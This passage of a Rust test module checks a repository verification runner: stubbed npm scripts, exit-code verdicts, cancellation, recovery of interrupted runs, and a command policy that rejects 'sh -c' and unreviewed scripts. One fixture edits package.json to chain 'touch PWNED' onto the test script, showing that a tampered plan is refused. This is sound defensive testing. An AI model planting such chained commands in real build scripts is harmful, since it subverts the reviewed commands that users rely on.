            "#!/bin/sh\nif [ \"$1 $2\" != \"run test\" ]; then echo unexpected; exit 9; fi\nif [ -f FAIL ]; then echo 'src/a.ts(1,5): error TS2322: Type string is not assignable'; exit 1; fi\necho ok\n",
        )
        .unwrap();
        std::fs::set_permissions(&npm, std::fs::Permissions::from_mode(0o755)).unwrap();
        let db = Arc::new(Database::open_in_memory());
        let (_, member_id) = crate::db::agents::tests::member(&db);
        db.write(|c| {
            let m = campaigns::get_member(c, &member_id)?;
            c.execute(
                "UPDATE repositories SET local_path = ?2, trust_status = ?3 WHERE id = ?1",
                rusqlite::params![
                    m.repository_id,
                    root.display().to_string(),
                    if trusted { "trusted" } else { "untrusted" }
                ],
            )?;
            Ok(())
        })
        .unwrap();
        let mut dirs = vec![bin];
        dirs.extend(std::env::split_paths(&std::env::var_os("PATH").unwrap()));
        let search: &'static SearchPath = Box::leak(Box::new(SearchPath {
            dirs,
            source: "test".into(),
        }));
        let events = Arc::new(Events::default());
        let ctx = VerifyContext {
            db: db.clone(),
            search,
            log_dir: None,
            sink: events.clone(),
            process_sink: Arc::new(crate::process::NullSink),
        };
        (t, root, db, member_id, ctx, events)
    }

    #[tokio::test]
    async fn real_exit_codes_decide_the_verdict_and_member_state() {
        let (_t, root, db, member_id, ctx, events) = setup(true);
        let jobs = Verifications::default();
        let hash = preflight(&db, &member_id).unwrap().plan.hash.unwrap();

        write(&root, "FAIL", "");
        let (_, handle) = jobs
            .start(ctx.clone(), &member_id, &hash, RunTrigger::Manual, None)
            .await
            .unwrap();
        let failed = handle.await.unwrap();
        assert_eq!(failed.status, VerificationStatus::Failed);
        assert_eq!(failed.summary["actionableFailures"], json!(["test"]));
        let checks = db.read(|c| store::list_checks(c, &failed.id)).unwrap();
        assert_eq!(checks[0].exit_code, Some(1));
        assert_eq!(
            checks[0].evidence.as_ref().unwrap()["affectedFiles"],
            json!(["src/a.ts"])
        );
        assert!(checks[0]
            .redacted_output
            .as_deref()
            .unwrap()
            .contains("TS2322"));
        assert_eq!(
            db.read(|c| campaigns::get_member(c, &member_id))
                .unwrap()
                .status,
            MembershipStatus::Failed
        );
        let repair = repair_failures(&db, &failed).unwrap();
        assert_eq!(repair.len(), 1);
        assert_eq!(repair[0].affected_files, ["src/a.ts"]);

        std::fs::remove_file(root.join("FAIL")).unwrap();
        let (_, handle) = jobs
            .start(ctx.clone(), &member_id, &hash, RunTrigger::Manual, None)
            .await
            .unwrap();
        let passed = handle.await.unwrap();
        assert_eq!(passed.status, VerificationStatus::Passed);
        assert_eq!(
            db.read(|c| campaigns::get_member(c, &member_id))
                .unwrap()
                .status,
            MembershipStatus::Verified
        );
        let log = db.read(|c| activity::list(c, &Default::default())).unwrap();
        let types: Vec<_> = log.items.iter().map(|e| e.event_type.as_str()).collect();
        assert!(
            types.contains(&"verification.failed") && types.contains(&"verification.passed"),
            "{types:?}"
        );
        assert!(events
            .0
            .lock()
            .unwrap()
            .iter()
            .any(|e| matches!(e, VerificationEvent::Completed { .. })));
    }

    #[tokio::test]
    async fn untrusted_changed_or_duplicate_plans_never_run() {
        let (_t, root, db, member_id, ctx, _) = setup(false);
        let jobs = Verifications::default();
        let err = preflight(&db, &member_id).err().unwrap();
        assert_eq!(err.code, ErrorCode::CommandNotAllowed);
        db.write(|c| {
            c.execute("UPDATE repositories SET trust_status = 'trusted'", [])?;
            Ok(())
        })
        .unwrap();
        let hash = preflight(&db, &member_id).unwrap().plan.hash.unwrap();
        // A script edited after review changes the plan: refused, nothing runs.
        write(
            &root,
            "package.json",
            r#"{"scripts":{"test":"tsc --noEmit && touch PWNED"}}"#,
        );
        let changed = jobs
            .start(ctx.clone(), &member_id, &hash, RunTrigger::Manual, None)
            .await
            .err()
            .unwrap();
        assert!(changed.message.contains("plan changed"));
        assert!(!root.join("PWNED").exists());
        assert_eq!(
            db.read(|c| store::list_runs(c, &Default::default()))
                .unwrap()
                .total,
            0
        );
    }

    #[tokio::test]
    async fn cancellation_stops_the_run_and_never_passes() {
        use std::os::unix::fs::PermissionsExt;
        let (t, _root, db, member_id, ctx, _) = setup(true);
        let npm = std::fs::canonicalize(t.path()).unwrap().join("bin/npm");
        std::fs::write(&npm, "#!/bin/sh\nsleep 30\n").unwrap();
        std::fs::set_permissions(&npm, std::fs::Permissions::from_mode(0o755)).unwrap();
        let jobs = Verifications::default();
        let hash = preflight(&db, &member_id).unwrap().plan.hash.unwrap();
        let (_, handle) = jobs
            .start(ctx.clone(), &member_id, &hash, RunTrigger::Manual, None)
            .await
            .unwrap();
        assert!(
            jobs.start(ctx.clone(), &member_id, &hash, RunTrigger::Manual, None)
                .await
                .is_err(),
            "no duplicate run"
        );
        tokio::time::sleep(Duration::from_millis(300)).await;
        assert!(jobs.cancel(&member_id));
        let run = handle.await.unwrap();
        assert_eq!(run.status, VerificationStatus::Cancelled);
        assert!(!jobs.cancel(&member_id));
        assert_ne!(
            db.read(|c| campaigns::get_member(c, &member_id))
                .unwrap()
                .status,
            MembershipStatus::Verified
        );
    }

    #[test]
    fn interrupted_runs_recover_as_error() {
        let db = Database::open_in_memory();
        let (_, member_id) = crate::db::agents::tests::member(&db);
        let run = db
            .write(|c| {
                let r = store::create_run(
                    c,
                    &NewVerificationRun {
                        campaign_repository_id: member_id.clone(),
                        agent_task_id: None,
                        profile: "node:npm".into(),
                        verified_commit_sha: "abc".into(),
                        plan_hash: Some("h".into()),
                        trigger: RunTrigger::Manual,
                    },
                )?;
                store::start_check(
                    c,
                    &r.id,
                    &NewCheck {
                        name: "test".into(),
                        category: CheckCategory::Test,
                        command: None,
                    },
                )?;
                Ok(r)
            })
            .unwrap();
        assert_eq!(db.write(|c| store::recover_interrupted(c)).unwrap(), 1);
        let after = db.read(|c| store::get_run(c, &run.id)).unwrap();
        assert_eq!(after.status, VerificationStatus::Error);
        assert_eq!(after.summary["interrupted"], json!(true));
        let checks = db.read(|c| store::list_checks(c, &run.id)).unwrap();
        assert_eq!(checks[0].status, CheckStatus::Cancelled);
    }

    #[test]
    fn verification_policy_runs_only_plan_vectors_in_a_trusted_checkout() {
        let t = tempfile::tempdir().unwrap();
        let root = std::fs::canonicalize(t.path()).unwrap();
        let policy = ExecutionPolicy::verification(
            root.clone(),
            vec![("pnpm".into(), vec!["run".into(), "test".into()])],
        );
        let spec = |program: &str, args: &[&str], trust| {
            let mut s = CommandSpec::new(
                "x",
                CommandCategory::Test,
                Program::Named(program.into()),
                args,
            );
            s.cwd = Some(root.clone());
            s.trust = trust;
            s
        };
        policy
            .check(&spec(
                "pnpm",
                &["run", "test"],
                TrustRequirement::TrustedRepository,
            ))
            .unwrap();
        for bad in [
            spec(
                "pnpm",
                &["run", "deploy"],
                TrustRequirement::TrustedRepository,
            ),
            spec(
                "pnpm",
                &["run", "test", "--", "--watch"],
                TrustRequirement::TrustedRepository,
            ),
            spec(
                "sh",
                &["-c", "pnpm run test"],
                TrustRequirement::TrustedRepository,
            ),
            spec("pnpm", &["run", "test"], TrustRequirement::None),
        ] {
            assert_eq!(
                policy.check(&bad).unwrap_err().code,
                ErrorCode::CommandNotAllowed
            );
        }
        let mut devin = spec(
            "pnpm",
            &["run", "test"],
            TrustRequirement::TrustedRepository,
        );
        devin.category = CommandCategory::Devin;
        assert!(policy.check(&devin).is_err());
    }
}
